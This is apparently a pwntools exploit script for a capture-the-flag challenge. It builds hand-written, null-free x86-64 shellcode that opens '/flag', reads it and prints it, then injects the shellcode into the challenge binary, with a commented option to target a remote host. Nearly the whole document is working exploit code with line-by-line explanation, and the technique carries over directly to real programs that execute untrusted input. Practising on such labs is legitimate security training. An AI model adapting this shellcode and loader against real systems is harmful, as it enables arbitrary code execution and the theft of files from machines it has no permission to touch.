from pwn import *

# Set context for x86-64 architecture
context.arch = 'amd64'
# context.log_level = 'debug' # Uncomment for detailed logging

# Null-free x86-64 shellcode to open("/flag"), read(fd, buffer, size), write(1, buffer, bytes_read)
shellcode_asm = """
    /* Clear eax (and thus rax by zero-extension). Will be used for pushing nulls. */
    xor eax, eax      

    /* 1. Create buffer for read (64 bytes) on stack. */
    /* RSI will point to this buffer. We push rax (0) 8 times for 64 bytes. */
    push rax          /* 8 bytes on stack */
    push rax          /* 16 bytes */
    push rax          /* 24 bytes */
    push rax          /* 32 bytes */
    push rax          /* 40 bytes */
    push rax          /* 48 bytes */
    push rax          /* 56 bytes */
    push rax          /* 64 bytes. RSP is now at the start of this buffer. */
    mov rsi, rsp      /* rsi = pointer to 64-byte read buffer */

    /* 2. Create "/flag\0" string on stack *after* (at lower stack addresses) the buffer. */
    /* RDI will point to this string. We need 8 bytes for "/flag\0". */
    push rax          /* Push 8 more null bytes. RSP now points to this new block. */
    mov rdi, rsp      /* rdi points to the start of these 8 null bytes. */

    /* Write "/flag" into the buffer at [rdi]. String will be "/flag\0". */
    /* Character values: '/' = 0x2f, 'f' = 0x66, 'l' = 0x6c, 'a' = 0x61, 'g' = 0x67 */
    mov byte ptr [rdi], 0x2f   /* [rdi+0] = '/' */
    mov byte ptr [rdi+1], 0x66 /* [rdi+1] = 'f' */
    mov byte ptr [rdi+2], 0x6c /* [rdi+2] = 'l' */
    mov byte ptr [rdi+3], 0x61 /* [rdi+3] = 'a' */
    mov byte ptr [rdi+4], 0x67 /* [rdi+4] = 'g' */
    /* [rdi+5] is already 0 from 'push rax'. So, [rdi] now holds "/flag\0". */

    /* 3. SYSCALL open(pathname=rdi, flags=rsi, mode=rdx) */
    /* rdi is already set to point to "/flag\0". */
    /* We need rsi for flags (O_RDONLY=0), but rsi currently points to our read buffer. Save it. */
    push rsi          
    xor esi, esi      /* Set rsi = 0 (O_RDONLY). Zeroes entire RSI. */
    xor edx, edx      /* Set rdx = 0 (mode). Zeroes entire RDX. */
    
    /* Set rax = 2 (syscall number for open) */
    xor eax, eax      /* rax = 0 */
    mov al, 2         /* rax = 2 */
    syscall           /* Execute open. File descriptor is returned in rax. */

    /* After syscall, fd is in rax. Restore rsi (which holds the read_buffer_ptr). */
    pop rsi           
    /* Move the file descriptor from rax to rdi for the read syscall. */
    mov rdi, rax      

    /* 4. SYSCALL read(fd=rdi, buf=rsi, count=rdx) */
    /* rdi = file descriptor (set from open's result). */
    /* rsi = read_buffer_ptr (restored). */
    /* Set rdx = count of bytes to read (e.g., 60 bytes, fits in our 64-byte buffer). */
    xor edx, edx      /* rdx = 0 */
    mov dl, 60        /* rdx = 60 (0x3c). Max read for our buffer. */
    
    /* Set rax = 0 (syscall number for read) */
    xor eax, eax      /* rax = 0 */
    syscall           /* Execute read. Number of bytes read is returned in rax. */

    /* 5. SYSCALL write(fd=rdi, buf=rsi, count=rdx) */
    /* Move the number of bytes read (from rax) to rdx (count for write). */
    mov rdx, rax      
    
    /* Set rdi = 1 (file descriptor for stdout). */
    xor edi, edi      /* rdi = 0 */
    inc edi           /* rdi = 1 */
    
    /* rsi is still pointing to read_buffer_ptr (containing the flag). */
    
    /* Set rax = 1 (syscall number for write). */
    xor eax, eax      /* rax = 0 */
    inc eax           /* rax = 1 */
    syscall           /* Execute write. */

    /* 6. SYSCALL exit(status=rdi) */
    /* Set rdi = 0 (exit status). */
    xor edi, edi      /* rdi = 0 */
    
    /* Set rax = 60 (syscall number for exit). */
    xor eax, eax      /* rax = 0 */
    mov al, 0x3c      /* rax = 60 (0x3c) */
    syscall           /* Execute exit. */
"""

# Assemble the shellcode
shellcode_bytes = asm(shellcode_asm)

# Verify that there are no null bytes
if b'\x00' in shellcode_bytes:
    log.error("FATAL: Null byte found in generated shellcode!")
    log.info(f"Shellcode (hex): {shellcode_bytes.hex()}")
    exit(1) # Use exit(1) for error, requires importing sys or using a different mechanism if not top-level script
else:
    log.success("Shellcode is null-free.")
    log.info(f"Shellcode length: {len(shellcode_bytes)} bytes")
    log.info(f"Shellcode (hex): {shellcode_bytes.hex()}")


try:
    # Update this path if your binary is located elsewhere
    challenge_binary_path = "/challenge/binary-exploitation-null-free-shellcode" 
    p = process(challenge_binary_path) # UNCOMMENT THIS LINE FOR LOCAL TESTING

    # Or for remote:
    # p = remote("your_hostname", 12345) # UNCOMMENT THIS LINE FOR REMOTE

    # Receive until the program asks for input
    p.recvuntil(b"Reading 0x1000 bytes from stdin.\\n\\n")
    log.info("Sending shellcode...")

    # Send the shellcode
    p.send(shellcode_bytes)

    # Try to receive the flag. The output might include other messages from the binary.
    # The flag should be printed by our shellcode before "### Goodbye!"
    log.info("Shellcode sent. Receiving output:")
    
    # Read everything until the process closes or a timeout occurs
    # You might need to adjust the timeout or recv method based on challenge behavior
    try:
        output = p.recvall(timeout=5) 
        log.info("Received:\\n" + output.decode(errors='ignore'))
    except EOFError:
        log.info("Process finished.")
    except PwnlibException as e: # Ensure PwnlibException is correctly referenced if not implicitly available
        log.warning(f"Error receiving data: {e}")


except FileNotFoundError:
    log.error(f"Challenge binary not found at specified path for local testing.")
    log.error("Please ensure the binary path is correct or use the 'remote' option if connecting to a server.")
except NameError: # Catches if 'p' was not defined (e.g. both process and remote are commented out)
    log.error("Connection (process or remote) was not initiated. Please uncomment the appropriate line.")
except Exception as e:
    log.error(f"An error occurred: {e}")
    log.error("If connecting remotely, ensure the server is running and accessible.")
    log.error("If running locally, ensure the binary has execute permissions.")
